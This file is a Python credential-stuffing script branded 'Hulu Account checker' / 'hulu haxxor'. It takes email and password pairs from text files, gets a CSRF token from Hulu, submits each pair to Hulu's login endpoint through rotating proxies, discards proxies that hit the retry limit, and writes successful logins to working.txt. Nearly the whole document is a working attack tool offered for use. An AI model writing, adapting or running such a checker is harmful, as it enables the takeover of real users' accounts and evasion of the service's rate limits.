import requests
import colorama
from colorama import Fore
import os
colorama.init(autoreset=True)

req = requests.Session()

req.proxies
proxies = {
    'http' : open('proxies.txt').readline()
}


beginning = colorama.Fore.GREEN + """

Made by:

  /$$$$$$                   /$$           /$$                   /$$/$$      /$$                  /$$      /$$
 /$$__  $$                 |__/          | $$                  | $| $$  /$ | $$                 | $$     | $$
| $$  \__/ /$$$$$$$ /$$$$$$ /$$ /$$$$$$ /$$$$$$   /$$$$$$  /$$$$$$| $$ /$$$| $$ /$$$$$$  /$$$$$$| $$ /$$$$$$$
|  $$$$$$ /$$_____//$$__  $| $$/$$__  $|_  $$_/  /$$__  $$/$$__  $| $$/$$ $$ $$/$$__  $$/$$__  $| $$/$$__  $$
 \____  $| $$     | $$  \__| $| $$  \ $$ | $$   | $$$$$$$| $$  | $| $$$$_  $$$| $$  \ $| $$  \__| $| $$  | $$
 /$$  \ $| $$     | $$     | $| $$  | $$ | $$ /$| $$_____| $$  | $| $$$/ \  $$| $$  | $| $$     | $| $$  | $$
|  $$$$$$|  $$$$$$| $$     | $| $$$$$$$/ |  $$$$|  $$$$$$|  $$$$$$| $$/   \  $|  $$$$$$| $$     | $|  $$$$$$$
 \______/ \_______|__/     |__| $$____/   \___/  \_______/\_______|__/     \__/\______/|__/     |__/\_______/
                              | $$                                                                           
                              | $$                                                                           
   Hulu Account checker       |__/                         


"""

def delete_line(name):
    r = open(str(name), 'r').read().splitlines(True)
    open(name, 'w').writelines(r[1:])


def check_existing():
    if os.stat('email.txt').st_size == 0:
        print('Finished checking Working: ' + Fore.GREEN + str(len(open('working.txt', 'r').readlines())))
        main_menu()
    elif os.stat('password.txt').st_size == 0 or os.stat('proxies.txt').st_size == 0:
        print(Fore.RED + 'You either forgot to enter the passwords or the proxies in the text files!')
        main_menu()
    

def checker_main():
    check_existing()
    try:
        s = req.get('https://secure.hulu.com/api/3.0/generate_csrf_value?for_hoth=true&path=/v2/web/password/authenticate').cookies
        req.cookies = s
    except requests.exceptions.SSLError:
        delete_line('proxies.txt')
        checker_main()


    payload = {
        'csrf' : req.cookies['_tcv'],
        'user_email' : open('email.txt', 'r').readline(),
        'password' : open('password.txt', 'r').readline()

    }

    e = req.post('https://auth.hulu.com/v2/web/password/authenticate', data=payload, proxies=proxies).json()

    if e.get('message') == 'Your login is invalid. Please try again.' or e.get('message') == 'Your login is invalid. Please refresh the page.':
        print(Fore.RED + str(payload['user_email']) + ':' + str(payload['password']))
        delete_line('email.txt')
        delete_line('password.txt')
        checker_main()

    elif e.get('error') == 'retry_limit':
        delete_line('proxies.txt')
        checker_main()

    else:
        print(Fore.GREEN + str(payload['user_email']) + ':' + str(payload['password']))
        open('working.txt', 'a').write('\n' + str(payload['user_email']) + ':' + str(payload['password']))
        delete_line('email.txt')
        delete_line('password.txt')
        checker_main()

def main_menu():
    os.system('title hulu haxxor 1.0.0 made by ScriptedWorldz ;)')
    print(Fore.GREEN + beginning)
    choice = input('Press x to start now : ')
    if choice == 'x' and os.stat('email.txt').st_size != 0 and os.stat('password.txt').st_size != 0:
        checker_main()

    else:
        print(Fore.RED + 'You dont have any accounts to check!')
        main_menu()

main_menu()